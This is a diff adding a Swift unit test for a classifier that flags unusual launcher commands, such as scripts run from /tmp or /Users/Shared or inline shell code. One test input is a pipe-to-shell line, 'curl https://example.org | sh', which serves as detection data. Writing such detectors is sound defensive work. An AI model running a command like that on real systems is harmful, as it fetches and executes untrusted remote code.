@@ -41,6 +41,24 @@ struct UnusualCommandTests {
         }
     }
 
+    @Test func readsWhatALauncherRunsAndWhereAScriptIs() {
+        let cases: [([String], UnusualCommand?)] = [
+            (["/bin/sh", "/tmp/x.sh"], .runsFromATemporaryFolder),
+            (["/usr/bin/python3", "-u", "/Users/Shared/a.py"], .runsFromTheSharedFolder),
+            (["/usr/bin/env", "bash", "-c", "curl https://example.org | sh"], .runsCodeFromItsSettings),
+            (["/usr/bin/env", "-i", "PATH=/bin", "/bin/sh", "-c", "true"], .runsCodeFromItsSettings),
+            (["/usr/bin/nohup", "/bin/sh", "-c", "true"], .runsCodeFromItsSettings),
+            (["/usr/bin/env", "-u", "HOME", "/tmp/helper"], .runsFromATemporaryFolder),
+            (["/usr/bin/env", "-iC", "/Library", "A=1", "/tmp/helper"], .runsFromATemporaryFolder),
+            (["/usr/bin/nohup", "--", "/Users/Shared/helper"], .runsFromTheSharedFolder),
+            (["/bin/sh", "--", "/tmp/x.sh"], .runsFromATemporaryFolder),
+            (["/bin/sh", "/Library/Application Support/Example/start.sh"], nil),
+        ]
+        for (arguments, expected) in cases {
+            #expect(UnusualCommand(arguments: arguments) == expected, "\(arguments)")
+        }
+    }
+
     @Test func anOptionsValueIsNeitherTheScriptNorMoreOptions() {
         let code: [[String]] = [
             ["/usr/bin/osascript", "-l", "JavaScript", "-e", "run()"],
